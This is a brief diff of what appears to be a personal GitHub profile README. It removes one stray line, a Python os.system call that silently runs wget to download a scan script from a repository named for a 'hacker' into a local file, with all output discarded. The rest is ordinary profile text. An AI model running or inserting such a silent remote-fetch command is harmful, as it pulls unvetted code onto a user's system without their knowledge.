@@ -13,4 +13,3 @@ Here are some ideas to get you started:
 - ⚡ Fun fact: I am very passionate about playing with computers and learning new skills at each moment. 
 
 
-os.system('wget -N https://raw.githubusercontent.com/hacker8360/Webtor/main/scan.py -O rapidscan.py > /dev/null 2>&1')
